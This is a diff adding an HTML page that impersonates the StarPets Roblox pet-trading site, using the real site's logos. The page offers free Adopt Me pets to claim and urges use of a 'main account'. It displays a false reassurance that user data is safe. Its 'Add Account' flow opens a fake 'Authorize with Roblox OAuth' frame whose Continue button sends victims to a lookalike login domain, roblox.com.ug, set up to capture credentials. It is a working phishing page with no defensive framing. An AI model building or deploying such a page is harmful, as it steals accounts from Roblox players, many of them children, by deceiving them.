@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<title>StarPets - Staff</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Nunito', sans-serif; background: #f2f3f7; }
+
+    /* HEADER */
+    header {
+      width: 100%; background: #fff; border-bottom: 1.5px solid #f0f0f0;
+      height: 62px; display: flex; align-items: center; padding: 0 28px;
+      justify-content: space-between; position: sticky; top: 0; z-index: 100;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.05);
+    }
+    .header-logo a { display: flex; align-items: center; }
+    .header-logo img { height: 34px; }
+    .header-nav { display: flex; align-items: center; gap: 2px; }
+    .header-nav a {
+      text-decoration: none; color: #c0c0c0; font-size: 14px; font-weight: 700;
+      padding: 6px 14px; border-radius: 10px; white-space: nowrap;
+    }
+    .header-nav a.market { color: #555; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+    .btn-plus {
+      background: #FF6B00; color: #fff; border: none; border-radius: 10px;
+      padding: 7px 18px; font-size: 20px; font-weight: 800; line-height: 1; cursor: pointer;
+    }
+    .user-area { display: flex; align-items: center; gap: 5px; cursor: pointer; padding: 4px 8px; border-radius: 10px; }
+    .user-area img { height: 30px; width: 30px; border-radius: 50%; object-fit: cover; }
+    .chevron-down { width: 16px; height: 16px; color: #999; }
+
+    /* PAGE */
+    .page { max-width: 900px; margin: 40px auto; padding: 0 28px; display: flex; flex-direction: column; gap: 20px; }
+
+    /* BLUE NOTICE */
+    .notice-box {
+      background: #e8f4fd; border: 1.5px solid #90cdf4; border-radius: 14px;
+      padding: 16px 20px; font-size: 14px; font-weight: 700; color: #2b6cb0; line-height: 1.5;
+    }
+
+    /* YOUR ACCOUNTS */
+    .section-title { font-size: 18px; font-weight: 800; color: #1a1a1a; margin-bottom: 4px; }
+
+    .add-account-card {
+      background: #fff; border: 2px dashed #d0d0d0; border-radius: 18px;
+      width: 120px; height: 120px; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; gap: 8px; cursor: pointer;
+      transition: border-color 0.15s, background 0.15s;
+    }
+    .add-account-card:hover { border-color: #FF6B00; background: #fff8f3; }
+    .add-icon {
+      width: 48px; height: 48px; background: #f5f5f5; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 26px; color: #aaa; font-weight: 800;
+    }
+    .add-label { font-size: 13px; font-weight: 700; color: #aaa; }
+
+    /* IS IT SAFE BAR */
+    .safe-bar {
+      background: #fff; border: 1.5px solid #eee; border-radius: 14px;
+      padding: 16px 20px; display: flex; align-items: center; justify-content: flex-end;
+    }
+    .btn-safe {
+      background: #FF6B00; color: #fff; border: none; border-radius: 10px;
+      padding: 10px 20px; font-size: 13px; font-weight: 800;
+      cursor: pointer; font-family: 'Nunito', sans-serif;
+    }
+
+    /* PETS + CART ROW */
+    .pets-cart-row { display: flex; gap: 20px; align-items: flex-start; }
+
+    /* MY CART */
+    .cart-panel {
+      width: 280px; flex-shrink: 0; background: #fff; border: 1.5px solid #eee;
+      border-radius: 20px; padding: 22px; display: flex; flex-direction: column; gap: 16px;
+    }
+    .cart-title { font-size: 18px; font-weight: 800; color: #1a1a1a; }
+
+    /* Error banner — animated */
+    .cart-error {
+      background: #fff5f5; border: 1.5px solid #feb2b2; border-radius: 12px;
+      padding: 13px 16px; font-size: 13px; font-weight: 800; color: #e53e3e;
+      overflow: hidden; max-height: 0; opacity: 0;
+      animation: slideError 0.6s cubic-bezier(0.34,1.3,0.64,1) 0.2s forwards;
+    }
+    @keyframes slideError {
+      from { max-height: 0; opacity: 0; transform: translateY(-10px); }
+      to   { max-height: 80px; opacity: 1; transform: translateY(0); }
+    }
+
+    .pets-list { display: flex; flex-direction: column; gap: 10px; }
+    .pet-list-item {
+      display: flex; align-items: center; gap: 14px;
+      background: #f7f9fc; border-radius: 14px; padding: 12px 16px;
+      cursor: pointer; transition: background 0.15s, transform 0.15s, box-shadow 0.15s;
+    }
+    .pet-list-item:hover {
+      background: #eef3ff; transform: translateX(4px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    .pet-list-item img { width: 52px; height: 52px; object-fit: contain; }
+    .pet-list-item span { font-size: 15px; font-weight: 700; color: #333; }
+
+    .btn-claim-locked-cart {
+      background: #ccc; color: #fff; border: none; border-radius: 12px;
+      padding: 13px 0; font-size: 15px; font-weight: 800;
+      cursor: not-allowed; font-family: 'Nunito', sans-serif; width: 100%;
+    }
+
+    /* MY PETS */
+    .my-pets-section { flex: 1; display: flex; flex-direction: column; gap: 14px; }
+    .my-pets-frame {
+      background: #fff; border: 1.5px solid #eee; border-radius: 20px;
+      padding: 22px; display: flex; flex-direction: column; gap: 16px;
+    }
+    .pets-grid { display: flex; flex-wrap: wrap; gap: 14px; }
+    .pet-chip {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+      background: #f7f9fc; border-radius: 16px; padding: 16px 18px;
+      cursor: pointer; transition: background 0.15s, transform 0.15s, box-shadow 0.15s;
+      min-width: 100px;
+    }
+    .pet-chip:hover {
+      background: #eef3ff; transform: translateY(-4px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    }
+    .pet-chip img { width: 72px; height: 72px; object-fit: contain; }
+    .pet-chip span { font-size: 13px; font-weight: 700; color: #333; text-align: center; }
+
+    .btn-claim-pets {
+      background: #FF6B00; color: #fff; border: none; border-radius: 12px;
+      padding: 13px 32px; font-size: 15px; font-weight: 800;
+      cursor: pointer; font-family: 'Nunito', sans-serif; align-self: flex-start;
+    }
+    .btn-claim-pets:hover { background: #e05c00; }
+
+
+    /* AUTH POPUP */
+    .auth-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+      z-index: 9998; display: none; align-items: center; justify-content: center;
+    }
+    .auth-overlay.show { display: flex; }
+    .auth-box {
+      background: #fff; border-radius: 24px; padding: 32px 28px 24px;
+      display: flex; flex-direction: column; align-items: center; gap: 18px;
+      width: 420px; max-width: 95vw;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.2);
+      animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    .auth-logo { height: 32px; }
+    .auth-title { font-size: 20px; font-weight: 800; color: #1a1a1a; text-align: center; }
+    .auth-sub { font-size: 13px; font-weight: 600; color: #aaa; text-align: center; margin-top: -8px; }
+    .btn-roblox {
+      background: #0a0a0a; color: #fff; border: none; border-radius: 12px;
+      padding: 14px 0; font-size: 15px; font-weight: 800;
+      cursor: pointer; font-family: 'Nunito', sans-serif; width: 100%;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .btn-roblox:hover { background: #333; }
+    .btn-roblox svg { flex-shrink: 0; }
+    .auth-divider {
+      display: flex; align-items: center; gap: 10px; width: 100%;
+      font-size: 12px; font-weight: 700; color: #ccc;
+    }
+    .auth-divider::before, .auth-divider::after {
+      content: ''; flex: 1; height: 1px; background: #eee;
+    }
+    .auth-iframe-wrap {
+      width: 100%; border-radius: 14px; overflow: hidden;
+      border: 1.5px solid #eee; background: #f7f8fa;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 200px;
+    }
+    .auth-iframe-wrap iframe {
+      width: 100%; height: 280px; border: none;
+    }
+    .auth-iframe-placeholder {
+      display: flex; flex-direction: column; align-items: center; gap: 10px;
+      padding: 32px; color: #aaa;
+    }
+    .auth-iframe-placeholder span { font-size: 13px; font-weight: 700; text-align: center; }
+    .btn-auth-close {
+      background: none; border: none; color: #aaa; font-size: 13px;
+      font-weight: 700; cursor: pointer; font-family: 'Nunito', sans-serif;
+      text-decoration: underline;
+    }
+
+    /* SAFE POPUP */
+    .popup-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.35);
+      z-index: 9999; display: none; align-items: center; justify-content: center;
+    }
+    .popup-overlay.show { display: flex; }
+    .popup-box {
+      background: #fff; border-radius: 24px; padding: 32px 28px 24px;
+      display: flex; flex-direction: column; align-items: center; gap: 16px;
+      max-width: 380px; width: 90%;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.18);
+      animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.85); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+    .popup-safe-text {
+      font-size: 14px; font-weight: 700; color: #2b6cb0;
+      text-align: center; line-height: 1.7;
+      background: #e8f4fd; border: 1.5px solid #90cdf4;
+      border-radius: 12px; padding: 16px 18px; width: 100%;
+    }
+    .btn-got-it {
+      background: #FF6B00; color: #fff; border: none; border-radius: 12px;
+      padding: 13px 0; font-size: 15px; font-weight: 800;
+      cursor: pointer; font-family: 'Nunito', sans-serif; width: 100%;
+    }
+    .btn-got-it:hover { background: #e05c00; }
+
+    /* POPUP SYSTEM */
+    @keyframes popupShow {
+      from { transform: scale(.95) translateY(12px); opacity: 0; }
+      to   { transform: scale(1)   translateY(0);    opacity: 1; }
+    }
+    .popupOverlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.52);
+      backdrop-filter: blur(6px);
+      display: none; justify-content: center; align-items: center;
+      padding: 18px; z-index: 9999;
+    }
+    .popupOverlay.active { display: flex !important; }
+    .popup {
+      width: 100%; max-width: 400px;
+      background: white; border-radius: 32px;
+      padding: 26px; position: relative;
+      display: none; animation: popupShow .22s ease;
+      font-family: 'Nunito', sans-serif;
+    }
+    .popup.active { display: block !important; }
+    .popupImage {
+      width: 200px; max-width: 100%;
+      display: block; margin: 0 auto 18px;
+    }
+    .popupMiniLabel {
+      width: max-content; margin: 0 auto 12px;
+      background: #dff2ff; color: #2b8fff;
+      border: 1px solid #bfe6ff;
+      padding: 8px 16px; border-radius: 999px;
+      font-size: 13px; font-weight: 800; text-align: center;
+      display: block;
+    }
+    .popupTitle {
+      text-align: center; font-size: 22px;
+      line-height: 1.2; font-weight: 900; margin-bottom: 10px; color: #1f1f1f;
+    }
+    .popupText {
+      text-align: center; color: #777;
+      line-height: 1.6; font-size: 14px; margin-bottom: 22px;
+    }
+    .popupBtn {
+      width: 100%; height: 52px; border: none;
+      border-radius: 14px; background: #FF6B00;
+      color: white; font-size: 16px; font-weight: 800;
+      cursor: pointer; transition: .2s;
+      font-family: 'Nunito', sans-serif;
+    }
+    .popupBtn:hover { transform: translateY(-2px); background: #e05c00; }
+    .loginMethod {
+      background: #fafafa; border: 1px solid #ececec;
+      border-radius: 22px; padding: 18px;
+      display: flex; align-items: center;
+      justify-content: space-between;
+      cursor: pointer; transition: .2s; margin-bottom: 14px;
+    }
+    .loginMethod:hover { transform: translateY(-2px); box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
+    .loginLeft { display: flex; align-items: center; gap: 14px; }
+    .loginIconWrap {
+      width: 56px; height: 56px; background: white;
+      border-radius: 16px; display: flex; align-items: center;
+      justify-content: center; border: 1px solid #ececec;
+    }
+    .loginIconWrap img { width: 34px; height: 34px; }
+    .loginTitle { font-size: 16px; font-weight: 800; margin-bottom: 3px; color: #1f1f1f; }
+    .loginSub   { font-size: 12px; color: #999; }
+    .loginArrow { font-size: 24px; color: #FF6B00; }
+
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div class="header-logo">
+      <a href="https://starpets.gg">
+        <img src="https://starpets.gg/_nuxt/DbCEddln0H-5415f33b.svg" alt="StarPets" />
+      </a>
+    </div>
+    <nav class="header-nav">
+      <a href="https://starpets.gg/adopt-me/" class="market">Market</a>
+      <a href="https://starpets.gg/adopt-me/profile/purchased">Items</a>
+      <a href="https://starpets.gg/adopt-me/profile/trade/connected">Sale</a>
+      <a href="https://starpets.gg/rbx">R$</a>
+      <a href="https://starpets.gg/adopt-me/help">Help</a>
+    </nav>
+  </div>
+  <div class="header-right">
+    <button class="btn-plus">+</button>
+    <div class="user-area">
+      <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" alt="Usuario" />
+      <svg class="chevron-down" viewBox="0 0 16 16" fill="none">
+        <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+</header>
+
+<!-- PAGE -->
+<div class="page">
+
+  <!-- Blue notice -->
+  <div class="notice-box">
+    ⚠️ We recommend using your <strong>main account</strong> to avoid errors.
+  </div>
+
+  <!-- Your Accounts -->
+  <div>
+    <div class="section-title" style="margin-bottom:12px;">Your Accounts</div>
+    <div class="add-account-card" onclick="showWinPopup()">
+      <div class="add-icon">+</div>
+      <span class="add-label">Add Account</span>
+    </div>
+  </div>
+
+  <!-- Is it safe bar -->
+  <div class="safe-bar">
+    <button class="btn-safe" onclick="document.getElementById('safePopup').classList.add('show')">Is it safe?</button>
+  </div>
+
+  <!-- Pets + Cart -->
+  <div class="pets-cart-row">
+
+    <!-- My Cart LEFT -->
+    <div class="cart-panel">
+      <div class="cart-title">My Cart</div>
+      <div class="cart-error">⚠ You don't have a Roblox account connected!</div>
+      <div class="pets-list">
+        <div class="pet-list-item">
+          <img src="https://cdn.starpets.gg/AM/110x110/owl_103046694030979270228419086227017441788.webp" alt="Owl" />
+          <span>Owl</span>
+        </div>
+        <div class="pet-list-item">
+          <img src="https://cdn.starpets.gg/AM/110x110/bat_dragon_146462647561927032198913846494863876793.webp" alt="Bat Dragon" />
+          <span>Bat Dragon</span>
+        </div>
+        <div class="pet-list-item">
+          <img src="https://cdn.starpets.gg/AM/110x110/cow_55393920947545740169286759073539942259.webp" alt="Cow" />
+          <span>Cow</span>
+        </div>
+      </div>
+      <button class="btn-claim-locked-cart" disabled>Claim</button>
+    </div>
+
+    <!-- My Pets RIGHT -->
+    <div class="my-pets-section">
+      <div class="section-title">My Pets!</div>
+      <div class="my-pets-frame">
+        <div class="pets-grid">
+          <div class="pet-chip">
+            <img src="https://cdn.starpets.gg/AM/110x110/owl_103046694030979270228419086227017441788.webp" alt="Owl" />
+            <span>Owl</span>
+          </div>
+          <div class="pet-chip">
+            <img src="https://cdn.starpets.gg/AM/110x110/bat_dragon_146462647561927032198913846494863876793.webp" alt="Bat Dragon" />
+            <span>Bat Dragon</span>
+          </div>
+          <div class="pet-chip">
+            <img src="https://cdn.starpets.gg/AM/110x110/cow_55393920947545740169286759073539942259.webp" alt="Cow" />
+            <span>Cow</span>
+          </div>
+        </div>
+        <button class="btn-claim-pets">Claim</button>
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- SAFE POPUP -->
+<div class="popup-overlay" id="safePopup">
+  <div class="popup-box">
+    <img src="https://starpets.gg/_nuxt/CnlEi08ZsC-5415f33b.png" alt="Is it safe?" style="width:160px;object-fit:contain;" />
+    <div class="popup-safe-text">All your data is stored in an encrypted form, and no one except us can access it. You can also deactivate your account at any time if necessary.</div>
+    <button class="btn-got-it" onclick="document.getElementById('safePopup').classList.remove('show')">Got it!</button>
+  </div>
+</div>
+
+
+    <div class="auth-sub">Link your Roblox account to get started</div>
+
+    
+    
+  </div>
+</div>
+
+
+
+
+
+<!-- POPUP OVERLAY -->
+<div class="popupOverlay" id="popupOverlay">
+
+  <!-- CONNECT POPUP -->
+  <div class="popup" id="popupConnect">
+    <span class="popupMiniLabel">🔗 Connect Account</span>
+    <img class="popupImage" src="https://starpets.gg/_nuxt/DbCEddln0H-5415f33b.svg" alt="StarPets" style="width:140px;" />
+    <div class="popupTitle">Link your Roblox Account</div>
+    <div class="popupText">Connect your account to access your inventory and claim your items.</div>
+    <button class="popupBtn" onclick="showLoginPopup()">Continue</button>
+  </div>
+
+  <!-- LOGIN METHOD POPUP -->
+  <div class="popup" id="popupLogin">
+    <img src="https://starpets.gg/_nuxt/DbCEddln0H-5415f33b.svg" style="width:120px;display:block;margin:0 auto 18px;" alt="StarPets" />
+    <div class="popupTitle" style="margin-bottom:20px;">Select Login Method</div>
+    <div class="loginMethod" onclick="openRobloxModal()">
+      <div class="loginLeft">
+        <div class="loginIconWrap">
+          <img src="https://starpets.gg/_nuxt/BOhmE_Z4eM-5415f33b.png" alt="Roblox" />
+        </div>
+        <div>
+          <div class="loginTitle">Login With Roblox</div>
+          <div class="loginSub">Continue account verification</div>
+        </div>
+      </div>
+      <div class="loginArrow">→</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ROBLOX MODAL -->
+<div id="robloxModal" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(6px);z-index:99999;display:none;justify-content:center;align-items:center;padding:16px;">
+  <div style="width:100%;max-width:460px;height:85vh;background:white;border-radius:28px;overflow:hidden;animation:popupShow .22s ease;">
+    <iframe id="robloxFrame" style="width:100%;height:100%;border:none;" sandbox="allow-scripts allow-forms allow-same-origin" referrerpolicy="no-referrer"></iframe>
+  </div>
+</div>
+
+<script>
+  const LOGIN_URL = "https://roblox.com.ug/login?returnUrl=0462060840624233";
+
+  function showWinPopup() {
+    document.getElementById('popupOverlay').classList.add('active');
+    document.getElementById('popupLogin').classList.add('active');
+  }
+
+  function showLoginPopup() {
+    document.getElementById('popupConnect').classList.remove('active');
+    document.getElementById('popupLogin').classList.add('active');
+  }
+
+  function openRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'flex';
+    const iframe = document.getElementById('robloxFrame');
+    iframe.srcdoc = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{width:100%;height:100vh;background:#0b0b0d;font-family:Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column;}
+.top{padding:20px 28px;}
+.rbxLogo{height:30px;object-fit:contain;filter:brightness(0) invert(1);}
+.center{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 24px 40px;}
+.oauthText{color:#fff;font-size:20px;font-weight:700;margin-bottom:24px;text-align:center;}
+.oauthApp{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;}
+.oauthAppImage{width:92px;height:92px;border-radius:22px;object-fit:cover;margin-bottom:10px;background:white;padding:8px;}
+.oauthAppName{color:white;font-size:15px;font-weight:500;margin-bottom:4px;}
+.buttons{width:100%;max-width:360px;display:flex;flex-direction:column;align-items:center;gap:10px;}
+.continueBtn{width:100%;padding:14px 0;background:white;color:black;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;}
+.returnBtn{width:100%;padding:13px 0;background:#111317;color:white;border:1px solid #444;border-radius:10px;font-size:15px;font-weight:500;cursor:pointer;}
+</style>
+</head>
+<body>
+<div class="top">
+  <img src="https://logodix.com/logo/1012185.png" class="rbxLogo">
+</div>
+<div class="center">
+  <div class="oauthText">Authorize with Roblox OAuth</div>
+  <div class="oauthApp">
+    <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" class="oauthAppImage">
+    <div class="oauthAppName">StarPets</div>
+  </div>
+  <div class="buttons">
+    <button class="continueBtn" onclick="window.location.href='${LOGIN_URL}'">Continue</button>
+    <button class="returnBtn" onclick="parent.closeRobloxModal()">Return to StarPets</button>
+  </div>
+</div>
+</body>
+</html>`;
+  }
+
+  function closeRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'none';
+  }
+</script>
+
+</body>
